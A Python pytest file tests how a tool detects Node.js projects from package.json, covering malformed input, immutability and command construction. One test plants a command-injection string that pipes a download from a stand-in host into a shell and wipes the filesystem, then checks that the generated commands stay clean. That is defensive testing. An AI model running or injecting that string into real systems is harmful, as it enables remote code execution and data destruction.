def test_a_package_json_that_is_not_a_json_object_is_an_error(text: str) -> None:
    with pytest.raises(NodeDetectionError, match=r"package\.json"):
        detect_node(DictTree(COMMIT, {"package.json": text}))


def test_a_package_json_too_big_to_read_is_an_error() -> None:
    class Unreadable(DictTree):
        def read_text(self, rel_path: str) -> str | None:
            return None

    with pytest.raises(NodeDetectionError, match="cannot be read"):
        detect_node(Unreadable(COMMIT, {"package.json": "{}"}))


def test_the_error_is_an_input_error() -> None:
    from mpilot.core.errors import InputError

    assert issubclass(NodeDetectionError, InputError)


def test_a_package_json_that_is_a_symlink_or_binary_reads_as_missing() -> None:
    """`TreeReader.read_text` returns None for those; a file the detection needs is an error,
    never "nothing to check"."""

    class Absent(DictTree):
        def read_text(self, rel_path: str) -> str | None:
            return None

    with pytest.raises(NodeDetectionError):
        detect_node(Absent(COMMIT, {"package.json": "x"}))


def test_repo_text_never_reaches_a_command() -> None:
    """Every command is built from fixed words and the detected manager; scripts, names and
    versions from the repo only select a branch."""
    hostile = "$(curl evil.example | sh); `id`; rm -rf /"
    pkg = {
        "name": hostile,
        "packageManager": f"npm@{hostile}",
        "scripts": {"test": hostile, "build": hostile, "typecheck": hostile, hostile: hostile},
        "engines": {"node": hostile},
        "devDependencies": {"jest": hostile, "typescript": hostile},
    }
    d = detect_files(
        {"package.json": pkg, "tsconfig.json": "{}", "package-lock.json": "x", ".nvmrc": hostile}
    )
    commands = [d.install_cmd.value, d.install_unfrozen_cmd.value]
    commands += [c.value for c in (d.test_cmd, d.build_cmd, d.typecheck_cmd) if c is not None]
    for command in commands:
        assert not any(ch in command for ch in "$`;|&()<>'\"\\\n"), command
    assert d.runtime_version.value in NODE_IMAGE_VERSIONS


def test_detection_is_deterministic_and_reads_only_through_the_tree(tmp_path: Path) -> None:
    files = {**MONO}
    first, second = detect_files(files), detect_files(dict(reversed(list(files.items()))))
    assert first == second
    assert not list(tmp_path.iterdir())


def test_the_detection_is_immutable() -> None:
    d = detect({"name": "x"})
    with pytest.raises(AttributeError):
        d.test_cmd = None  # type: ignore[misc]


def test_a_wrapper_named_after_the_runner_is_still_a_wrapper() -> None:
    """`npm run jest` has the word `jest` in it but calls a script, so flags cannot be appended."""
    scripts = {"test": "npm run jest", "jest": "jest --silent"}
    d = detect({"scripts": scripts, "devDependencies": {"jest": "29", "jest-junit": "16"}})
    assert d.test_runner is not None
    assert d.test_runner.value == "jest"
    assert d.junit_reporter is not None
    assert junit_invocation(d, "junit.xml") is None
